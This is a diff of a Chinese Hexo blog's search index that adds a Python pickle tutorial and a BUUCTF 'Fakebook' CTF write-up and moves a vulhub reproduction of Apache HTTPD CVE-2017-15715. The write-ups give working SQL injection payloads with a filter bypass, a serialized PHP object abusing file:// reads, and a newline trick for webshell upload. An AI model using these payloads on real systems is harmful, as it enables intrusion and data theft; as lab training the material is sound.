@@ -1,6 +1,55 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>pickle 库</title>
+    <url>/2022/01/30/pickle%20%E5%BA%93/</url>
+    <content><![CDATA[<p>pickle 库的简单使用。</p>
+<span id="more"></span>
+<h1 id="前言">前言</h1>
+<p>官方文档：<a href="https://docs.python.org/zh-cn/3/library/pickle.html">pickle</a></p>
+<h1 id="介绍">介绍</h1>
+<p>模块 pickle 实现了对一个 Python 对象结构的二进制序列化和反序列化。</p>
+<h1 id="常用方法">常用方法</h1>
+<p>主要由两类接口，即序列化和反序列化。</p>
+<p>其中序列化包括： 1. dump() 2. dumps()</p>
+<p>反序列化包括： 1. load() 2. loads()</p>
+<p><strong>序列化后的对象是 bytes 类型的，反序列后的对象同样也是 bytes 类型的，也就是二进制文件。</strong></p>
+<h2 id="dump">dump</h2>
+<p>语法： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.dump(obj, file, protocol=<span class="literal">None</span>, *, fiximports=<span class="literal">True</span>, buffer_callback=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>将对象 obj 序列化以后的对象写入已打开的 file object file。</p>
+</blockquote>
+<p>参数： 主要参数就是前两个： - obj：要序列化的对象 - file：序列化完之后的对象需要写入到 file 中。</p>
+<p>例子： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">tar = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;lihua&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>&#125;  </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pickle使用的文件/after.p&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    pickle.dump(tar, f)</span><br></pre></td></tr></table></figure></p>
+<h2 id="dumps">dumps</h2>
+<p>语法： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.dump(obj, protocol=<span class="literal">None</span>, *, fiximports=<span class="literal">True</span>, buffer_callback=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
+<p>参数： - obj：要序列化的对象 - 少了 file</p>
+<ul>
+<li>返回值 <strong>直接返回序列化后的二进制对象。（这是与 dump 最大的区别）</strong></li>
+</ul>
+<p>例子： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">tar = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;lihua&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(tar))</span><br></pre></td></tr></table></figure></p>
+<p>结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\x80\x04\x95\x1c\x00\x00\x00\x00\x00\x00\x00&#125;\x94(\x8c\x04name\x94\x8c\x05lihua\x94\x8c\x03age\x94K\x1eu.&#x27;</span><br></pre></td></tr></table></figure></p>
+<h2 id="load">load</h2>
+<p>语法： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.load(file, *, protocol=<span class="literal">None</span>, fiximports=<span class="literal">True</span>, encoding=<span class="string">&#x27;ASCII&#x27;</span>, errors=<span class="string">&#x27;strict&#x27;</span>, buffers=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
+<p>参数： - file：要反序列的<strong>二进制文件</strong></p>
+<p>例子： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pickle使用的文件/after.p&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    <span class="built_in">print</span>(pickle.load(f))</span><br></pre></td></tr></table></figure></p>
+<p>利用上面的 dump 的序列化后的二进制文件做演示，得到结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;name&#x27;: &#x27;lihua&#x27;, &#x27;age&#x27;: 30&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="loads">loads</h2>
+<p>语法： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.loads(data, /, *, fix_imports=<span class="literal">True</span>, encoding=<span class="string">&quot;ASCII&quot;</span>, errors=<span class="string">&quot;strict&quot;</span>, buffers=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
+<p>参数： - data：需要反序列化的<strong>二进制对象</strong></p>
+<p>返回值： <strong>直接返回反序列化后的对象。（这是与 load 的最大区别）</strong></p>
+<p>例子： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">tar = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;lihua&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>&#125;</span><br><span class="line">tars = pickle.dumps(tar)  <span class="comment"># 先序列化</span></span><br><span class="line"><span class="built_in">print</span>(pickle.loads(tars)) <span class="comment"># 再反序列化</span></span><br></pre></td></tr></table></figure></p>
+<p>结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;name&#x27;: &#x27;lihua&#x27;, &#x27;age&#x27;: 30&#125;</span><br></pre></td></tr></table></figure></p>
+]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
+      <tags>
+        <tag>python</tag>
+        <tag>pickle</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Redtiger_Hackit_WriteUp</title>
     <url>/2022/03/18/Redtiger&#39;s_Hackit_WriteUp/</url>
     <content><![CDATA[<p>网站：https://redtiger.labs.overthewire.org/</p>
@@ -254,52 +303,37 @@
       </tags>
   </entry>
   <entry>
-    <title>pickle 库</title>
-    <url>/2022/01/30/pickle%20%E5%BA%93/</url>
-    <content><![CDATA[<p>pickle 库的简单使用。</p>
+    <title>复现：Apache HTTPD 换行解析漏洞（CVE-2017-15715）</title>
+    <url>/2022/03/21/%E5%A4%8D%E7%8E%B0%EF%BC%9AApache%20HTTPD%20%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-15715%EF%BC%89/</url>
+    <content><![CDATA[<p>个人的漏洞复现练习，请多批评！</p>
 <span id="more"></span>
-<h1 id="前言">前言</h1>
-<p>官方文档：<a href="https://docs.python.org/zh-cn/3/library/pickle.html">pickle</a></p>
-<h1 id="介绍">介绍</h1>
-<p>模块 pickle 实现了对一个 Python 对象结构的二进制序列化和反序列化。</p>
-<h1 id="常用方法">常用方法</h1>
-<p>主要由两类接口，即序列化和反序列化。</p>
-<p>其中序列化包括： 1. dump() 2. dumps()</p>
-<p>反序列化包括： 1. load() 2. loads()</p>
-<p><strong>序列化后的对象是 bytes 类型的，反序列后的对象同样也是 bytes 类型的，也就是二进制文件。</strong></p>
-<h2 id="dump">dump</h2>
-<p>语法： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.dump(obj, file, protocol=<span class="literal">None</span>, *, fiximports=<span class="literal">True</span>, buffer_callback=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
-<blockquote>
-<p>将对象 obj 序列化以后的对象写入已打开的 file object file。</p>
-</blockquote>
-<p>参数： 主要参数就是前两个： - obj：要序列化的对象 - file：序列化完之后的对象需要写入到 file 中。</p>
-<p>例子： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">tar = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;lihua&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>&#125;  </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pickle使用的文件/after.p&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    pickle.dump(tar, f)</span><br></pre></td></tr></table></figure></p>
-<h2 id="dumps">dumps</h2>
-<p>语法： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.dump(obj, protocol=<span class="literal">None</span>, *, fiximports=<span class="literal">True</span>, buffer_callback=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
-<p>参数： - obj：要序列化的对象 - 少了 file</p>
-<ul>
-<li>返回值 <strong>直接返回序列化后的二进制对象。（这是与 dump 最大的区别）</strong></li>
-</ul>
-<p>例子： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">tar = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;lihua&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(tar))</span><br></pre></td></tr></table></figure></p>
-<p>结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\x80\x04\x95\x1c\x00\x00\x00\x00\x00\x00\x00&#125;\x94(\x8c\x04name\x94\x8c\x05lihua\x94\x8c\x03age\x94K\x1eu.&#x27;</span><br></pre></td></tr></table></figure></p>
-<h2 id="load">load</h2>
-<p>语法： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.load(file, *, protocol=<span class="literal">None</span>, fiximports=<span class="literal">True</span>, encoding=<span class="string">&#x27;ASCII&#x27;</span>, errors=<span class="string">&#x27;strict&#x27;</span>, buffers=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
-<p>参数： - file：要反序列的<strong>二进制文件</strong></p>
-<p>例子： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pickle使用的文件/after.p&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    <span class="built_in">print</span>(pickle.load(f))</span><br></pre></td></tr></table></figure></p>
-<p>利用上面的 dump 的序列化后的二进制文件做演示，得到结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;name&#x27;: &#x27;lihua&#x27;, &#x27;age&#x27;: 30&#125;</span><br></pre></td></tr></table></figure></p>
-<h2 id="loads">loads</h2>
-<p>语法： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.loads(data, /, *, fix_imports=<span class="literal">True</span>, encoding=<span class="string">&quot;ASCII&quot;</span>, errors=<span class="string">&quot;strict&quot;</span>, buffers=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
-<p>参数： - data：需要反序列化的<strong>二进制对象</strong></p>
-<p>返回值： <strong>直接返回反序列化后的对象。（这是与 load 的最大区别）</strong></p>
-<p>例子： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">tar = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;lihua&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>&#125;</span><br><span class="line">tars = pickle.dumps(tar)  <span class="comment"># 先序列化</span></span><br><span class="line"><span class="built_in">print</span>(pickle.loads(tars)) <span class="comment"># 再反序列化</span></span><br></pre></td></tr></table></figure></p>
-<p>结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;name&#x27;: &#x27;lihua&#x27;, &#x27;age&#x27;: 30&#125;</span><br></pre></td></tr></table></figure></p>
+<h1 id="漏洞信息">漏洞信息</h1>
+<p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其<strong>2.4.0~2.4.29版本</strong>中存在一个解析漏洞，在解析PHP时，<code>1.php\x0A</code>将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p>
+<p>Path：https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715</p>
+<p>运行漏洞环境： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></p>
+<p>然后输入：<code>http://ip:8080</code> 即可访问</p>
+<h1 id="复现">复现</h1>
+<p>上传一个木马，发现被拦截： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094109.png" /></p>
+<p>此时修改 24 行那，首先添加一个字符，然后选定，此时右边会有编码的区域。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094419.png" /></p>
+<p>在 code 那块写上 0a（ascii码表的换行符的16进制），然后点击 <code>apply changes</code> 。此时就加入了一个换行符 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094602.png" /></p>
+<p>然后再次发送该数据包，此时成功发送。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094636.png" /></p>
+<p>访问 <code>http"//ip:8080/shell.php%0a</code>，发现能够访问，说明文件上传成功。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094816.png" /></p>
+<p>利用蚁剑连接 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094907.png" /></p>
+<p>成功获得 webshell。</p>
+<h1 id="总结">总结</h1>
+<p>查看一下源码（关键部分） <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$name</span> = basename(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$ext</span> = pathinfo(<span class="variable">$name</span>,PATHINFO_EXTENSION);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$ext</span>, [<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;php3&#x27;</span>, <span class="string">&#x27;php4&#x27;</span>, <span class="string">&#x27;php5&#x27;</span>, <span class="string">&#x27;phtml&#x27;</span>, <span class="string">&#x27;pht&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;bad file&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;./&#x27;</span> . <span class="variable">$name</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>换行符绕过了 <code>in_array()</code> 的黑名单过滤。但是 <code>php%0a</code> 并不是 <code>php</code> 文件，不会被执行，这就证明了存在解析漏洞。</p>
+<h1 id="资源">资源</h1>
+<ol type="1">
+<li><a href="https://vulhub.org/#/environments/httpd/CVE-2017-15715/">vulhub</a></li>
+<li><a href="https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715">githubVulhub</a></li>
+</ol>
 ]]></content>
       <categories>
-        <category>python</category>
+        <category>漏洞复现</category>
       </categories>
       <tags>
-        <tag>python</tag>
-        <tag>pickle</tag>
+        <tag>漏洞复现</tag>
       </tags>
   </entry>
   <entry>
@@ -628,37 +662,61 @@
       </tags>
   </entry>
   <entry>
-    <title>复现：Apache HTTPD 换行解析漏洞（CVE-2017-15715）</title>
-    <url>/2022/03/21/%E5%A4%8D%E7%8E%B0%EF%BC%9AApache%20HTTPD%20%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-15715%EF%BC%89/</url>
-    <content><![CDATA[<p>个人的漏洞复现练习，请多批评！</p>
+    <title>网鼎杯 2018 Fakebook</title>
+    <url>/2022/03/21/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%20Fakebook/</url>
+    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
 <span id="more"></span>
-<h1 id="漏洞信息">漏洞信息</h1>
-<p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其<strong>2.4.0~2.4.29版本</strong>中存在一个解析漏洞，在解析PHP时，<code>1.php\x0A</code>将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p>
-<p>Path：https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715</p>
-<p>运行漏洞环境： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></p>
-<p>然后输入：<code>http://ip:8080</code> 即可访问</p>
-<h1 id="复现">复现</h1>
-<p>上传一个木马，发现被拦截： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094109.png" /></p>
-<p>此时修改 24 行那，首先添加一个字符，然后选定，此时右边会有编码的区域。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094419.png" /></p>
-<p>在 code 那块写上 0a（ascii码表的换行符的16进制），然后点击 <code>apply changes</code> 。此时就加入了一个换行符 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094602.png" /></p>
-<p>然后再次发送该数据包，此时成功发送。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094636.png" /></p>
-<p>访问 <code>http"//ip:8080/shell.php%0a</code>，发现能够访问，说明文件上传成功。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094816.png" /></p>
-<p>利用蚁剑连接 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094907.png" /></p>
-<p>成功获得 webshell。</p>
+<h1 id="题目信息">题目信息</h1>
+<p>进入环境，有 <code>login</code> 和 <code>join</code> 两个按钮，先用 admin 弱口令测试了一下，发现登陆失败，就尝试注册一个账号。这里需要注意的是 blog 那一栏应该有特殊的验证，我这里使用 <code>123.blog</code> 成功注册。</p>
+<p>登录成功后发现username可以点击，点击之后 url 出现了一个 no 参数，因此测试一下是否存在 sql 注入。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321162039.png" /></p>
+<h1 id="第一次sql注入">第一次sql注入</h1>
+<p>先用如下payload测试，发现注入点的闭合方式为空。接下来就是常规的注入过程。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=1=1</span><br><span class="line">?no=1=2</span><br></pre></td></tr></table></figure></p>
+<p>然后 fuzz 以下，发现没有字符被过滤（可能是我的字典太小了）</p>
+<h2 id="获取字段数">获取字段数</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=1 order by 4</span><br></pre></td></tr></table></figure>
+<h2 id="测试显示位">测试显示位</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union select 1,2,3,4</span><br></pre></td></tr></table></figure>
+<p>发现这个payload被过滤了。但是空格， 逗号，union，select都没有被过滤。经过多次测试，发现后台应该检测的是<code>union select</code>，那么payload设置为 <code>union/**/select</code> 即可绕过。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union/**/select 1,2,3,4</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321162640.png" /></p>
+<p>上面的信息很丰富：</p>
+<ul>
+<li><strong>Notice</strong>: unserialize(): Error at offset 0 of 1 bytes in <strong>/var/www/html/view.php</strong> on line <strong>31</strong> 存在反序列化</li>
+<li>显示位为 2</li>
+<li>地址为：<strong>/var/www/html/view.php</strong></li>
+</ul>
+<h2 id="常规注入">常规注入</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. ?no=-1 union/**/select 1,database(),3,4</span><br><span class="line">2. ?no=-1 union/**/select 1,user(),3,4</span><br><span class="line">3. ?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()</span><br><span class="line">4. ?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#x27;users&#x27;</span><br><span class="line">5. ?no=-1 union/**/select 1,no,3,4 from fakebook.users</span><br></pre></td></tr></table></figure>
+<p>获得的结果依次是： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fakebook</span><br><span class="line">root@localhost</span><br><span class="line">users</span><br><span class="line">no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</span><br><span class="line">1</span><br><span class="line">hdf</span><br><span class="line">3c9909afec25354d551dae21590bb26e38d53f2173b8d3dc3eee4c047e7ab1c1eb8b85103e3be7ba613b31bb5c9c36214dc9f14a42fd7a2fdb84856bca5c44c2</span><br><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;hdf&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:8:&quot;123.blog&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>接下来就不知道该如何是好了，如果是单纯的 sql 注入，应该会显示出 flag，这明显是信息收集的还不够。</p>
+<h1 id="信息收集">信息收集</h1>
+<p>想到 <code>robots.txt</code> 看一下 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /user.php.bak</span><br></pre></td></tr></table></figure></p>
+<p>发现存在着备份文件泄露，下载打开得到如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>（这里也说明，blog是有特殊的格式要求的。）</p>
+<p>发现确实存在序列化的过程，注意到 <code>function get($url)</code> 和 <code>public function getBlogContents ()</code> 可以读取文件内容，并且上面已经得到文件路径了，那么猜测flag所在的文件路径为：<code>/var/www/html/flag.php</code>。</p>
+<p>编写如下脚本： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;hdf&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> UserInfo;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>得到： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;hdf&quot;;s:3:&quot;age&quot;;i:20;s:4:&quot;blog&quot;;s:29:&quot;/var/www/html/flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>那么接下来问题就是哪里传入我们构造的序列化后的字符串。</p>
+<h1 id="第二次sql注入">第二次sql注入</h1>
+<p>注意力回到： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union/**/select 1,2,3,4</span><br></pre></td></tr></table></figure></p>
+<p>注意到4个字段顺序：<code>no,username,passwd,data</code> ，猜测分别对应 1，2，3，4。并且 data 字段返回的是一个序列化后的过程。因此，做一个假设：</p>
+<p><strong>后台的工作模式：先用 no 进行第一次查询，然后得到对应的 <code>no,username,passwd,data</code> 信息。接着将 data 字段进行反序列后，获取对应地址的内容。</strong></p>
+<p>因此，将上述序列化后的字符带入得到如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;hdf&quot;;s:3:&quot;age&quot;;i:20;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span><br></pre></td></tr></table></figure></p>
+<p>查看源码发现： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321165151.png" /></p>
+<p>点击得到 flag。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321165208.png" /></p>
+<h1 id="其他注入方法">其他注入方法</h1>
+<p>注意到，获取用户信息的时候得到的是：<code>root@localhost</code>，root权限非常大，因此可以尝试直接读取flag文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union/**/select 1,load_file(&#x27;/var/www/html/flag.php&#x27;),3,4</span><br></pre></td></tr></table></figure>
+<p>查看源码，直接获得 flag <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321165450.png" /></p>
 <h1 id="总结">总结</h1>
-<p>查看一下源码（关键部分） <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$name</span> = basename(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$ext</span> = pathinfo(<span class="variable">$name</span>,PATHINFO_EXTENSION);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$ext</span>, [<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;php3&#x27;</span>, <span class="string">&#x27;php4&#x27;</span>, <span class="string">&#x27;php5&#x27;</span>, <span class="string">&#x27;phtml&#x27;</span>, <span class="string">&#x27;pht&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;bad file&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;./&#x27;</span> . <span class="variable">$name</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>换行符绕过了 <code>in_array()</code> 的黑名单过滤。但是 <code>php%0a</code> 并不是 <code>php</code> 文件，不会被执行，这就证明了存在解析漏洞。</p>
-<h1 id="资源">资源</h1>
-<ol type="1">
-<li><a href="https://vulhub.org/#/environments/httpd/CVE-2017-15715/">vulhub</a></li>
-<li><a href="https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715">githubVulhub</a></li>
-</ol>
